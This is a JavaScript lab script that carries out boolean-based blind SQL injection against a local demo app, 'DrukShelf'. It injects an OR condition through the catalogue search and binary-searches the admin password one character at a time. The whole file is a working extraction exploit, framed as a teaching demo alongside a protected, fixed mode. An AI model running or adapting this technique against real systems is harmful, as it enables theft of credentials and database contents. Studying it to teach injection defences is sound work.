'use strict';

/**
 * ============================================================================
 *  Automated BLIND SQL-injection extractor  (local lab tool)
 * ============================================================================
 *
 * This script talks ONLY to the DrukShelf demo you run yourself on localhost.
 * It demonstrates the most alarming property of SQL injection: an attacker does
 * not need the application to *display* any secret data. As long as the page
 * reacts DIFFERENTLY to a true vs. a false condition, the whole database can be
 * read back one bit at a time. This is "boolean-based blind" injection.
 *
 * The oracle
 * ----------
 * The catalogue search runs (in vulnerable mode):
 *
 *     SELECT ... FROM books WHERE title LIKE '%<term>%' ORDER BY id
 *
 * We send the term:
 *
 *     zzzzz' OR (<condition>)--
 *
 * which the server turns into:
 *
 *     ... WHERE title LIKE '%zzzzz' OR (<condition>)-- %' ORDER BY id
 *
 * No real book contains "zzzzz", so the page shows results ONLY when
 * <condition> is true. "results present" therefore means TRUE, and
 * "No books matched" means FALSE — a perfect 1-bit oracle.
 *
 * Using that single bit and a binary search, the script recovers the admin
 * account's password without the password ever appearing on screen.
 *
 * Usage:   node attacker/extract.js            (defaults to http://localhost:3000)
 *          node attacker/extract.js http://localhost:3000
 */

const BASE = process.argv[2] || 'http://localhost:3000';
const TARGET_USER = 'admin';

let requestCount = 0;

/**
 * Ask the vulnerable server one yes/no question.
 * Returns true when the injected condition is true (books are returned).
 */
async function ask(condition) {
  const term = `zzzzz' OR (${condition})-- `;
  const url = `${BASE}/catalog?q=${encodeURIComponent(term)}`;
  requestCount++;
  const res = await fetch(url);
  const html = await res.text();
  // The page prints "row(s) returned" when the result set is non-empty, and a
  // "No books matched" alert when it is empty.
  return html.includes('row(s) returned');
}

/** Binary-search an integer value in [lo, hi] using the SQL expression `expr`. */
async function bisect(expr, lo, hi) {
  while (lo < hi) {
    const mid = (lo + hi) >> 1;
    if (await ask(`${expr} > ${mid}`)) lo = mid + 1;
    else hi = mid;
  }
  return lo;
}

async function main() {
  console.log(`\nTarget : ${BASE}`);
  console.log(`Victim : users row where username = '${TARGET_USER}'`);
  console.log('Method : boolean-based blind SQL injection via the catalogue search\n');

  // Sanity check: is the injection even working / are we against the vulnerable
  // build? "1=1" must be true and "1=2" must be false.
  const trueProbe = await ask('1=1');
  const falseProbe = await ask('1=2');
  if (!trueProbe || falseProbe) {
    console.log('Injection does not appear to work here.');
    console.log('The server is most likely running in PROTECTED mode');
    console.log('(npm run start:protected) — the quote is bound as data, so');
    console.log('the OR is never injected. That is the fix doing its job.\n');
    return;
  }
  console.log('Oracle confirmed: "1=1" -> results, "1=2" -> no results.\n');

  const subpass = `(SELECT password FROM users WHERE username='${TARGET_USER}')`;

  // 1) Recover the password length.
  const length = await bisect(`length(${subpass})`, 0, 64);
  console.log(`Password length: ${length} characters`);
  if (length === 0) {
    console.log('No such user, or empty password — stopping.\n');
    return;
  }

  // 2) Recover each character by its Unicode code point (printable ASCII).
  process.stdout.write('Extracting password: ');
  let password = '';
  for (let pos = 1; pos <= length; pos++) {
    const expr = `unicode(substr(${subpass}, ${pos}, 1))`;
    const code = await bisect(expr, 32, 126);
    password += String.fromCharCode(code);
    process.stdout.write(String.fromCharCode(code));
  }

  console.log('\n');
  console.log('────────────────────────────────────────────');
  console.log(`  Recovered password for '${TARGET_USER}':  ${password}`);
  console.log(`  HTTP requests sent:                 ${requestCount}`);
  console.log('────────────────────────────────────────────');
  console.log('\nThe password was never shown on any page — it was reconstructed');
  console.log('purely from whether the catalogue returned rows or not.\n');
}

main().catch((err) => {
  console.error('\nError talking to the demo server:', err.message);
  console.error(`Is DrukShelf running at ${BASE}?  Start it with: npm run start:vulnerable\n`);
  process.exit(1);
});
